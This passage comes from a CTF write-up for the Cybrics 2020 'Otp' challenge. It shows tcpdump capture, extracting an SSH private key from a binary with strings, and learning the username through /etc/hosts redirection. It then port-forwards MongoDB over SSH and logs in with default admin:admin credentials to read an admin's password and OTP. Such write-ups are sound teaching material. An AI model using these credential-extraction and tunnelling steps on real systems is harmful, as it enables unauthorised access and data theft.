sent to that specific ip, we used tcpdump : tcpdump -i wlp7s0 dst 34.76.112.206 -w Capture.pcap Taking a look at the capture with wireshark: Wireshark We confirmed the app is using ssh but we have no creds or ssh keys since the packets are encrypted, running strings on the app and greping for specific patterns we got ssh private keys id_rsa We need a username now, we tried guessing nothing came out, To try and get the username we modified out /etc/hosts so the challenge domain points back to our loopback address 127.0.0.1 we run the binary and the we check our ssh logs with: systemctl status sshd we got : sshd[13342]: Invalid user guest from 127.0.0.1 port 40898 The user is guest, I guess our guess work wasn’t on point 😛 . Now we got everything for the ssh connection. ","date":"2020-08-08","objectID":"/cybrics2020-otp/:3:2","tags":["linux","ctb","cybrics-ctf","ssh"],"title":"Cybrics2020 Otp","uri":"/cybrics2020-otp/"},{"categories":["ctf-writeups"],"content":"SSH session Connection to the ssh session we don’t get a shell but instead a clear prompt, poking at it a little we know it’s the server’s binary, we don’t get much, but it’s ssh and ssh has many features builtin on it, one of many is port forwarding (more on port forwarding over here ), we port forward the mongodb port 27017 since we already got the creds from the source code of the server. ssh -L 27017:localhost:27017 guest@34.76.112.206 -i id_rsa Checking open port on our machine and: tcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN 9530/ssh It’s open. ","date":"2020-08-08","objectID":"/cybrics2020-otp/:3:3","tags":["linux","ctb","cybrics-ctf","ssh"],"title":"Cybrics2020 Otp","uri":"/cybrics2020-otp/"},{"categories":["ctf-writeups"],"content":"Connecting to mongodb Since we already have the creds mongodb://admin:admin@localhost:27017 and the db name cybrics (Both from the source code). We can connect right to the db away : mongo -u admin -p admin --authenticationDatabase cybrics We already know the schema from the source so we right away query the admin user \u003e use cybrics switched to db cybrics \u003e db cybrics \u003e db.users.find({username : \"admin\"}) { \"_id\" : ObjectId(\"5f1ae2e97e2bd0263657b0ee\"), \"username\" : \"admin\", \"password\" : \"j77d32g72373ggasdkasdGG\u0026SD\", \"otp\" : \"f41a137f-aeb0-4518-9d20-2aafc4fcb90f\" } \u003e We get the admin’s otp : f41a137f-aeb0-4518-9d20-2aafc4fcb90f We submit it in the web to get the flag: Flag Flag: cybrics{n07_S0_D1fF1cuL7_8U7_4lw4yS_chECK_P0R7_F0rw4Rd1N9} ","date":"2020-08-08","objectID":"/cybrics2020-otp/:3:4","tags":["linux","ctb","cybrics-ctf","ssh"],"title":"Cybrics2020 Otp","uri":"/cybrics2020-otp/"}]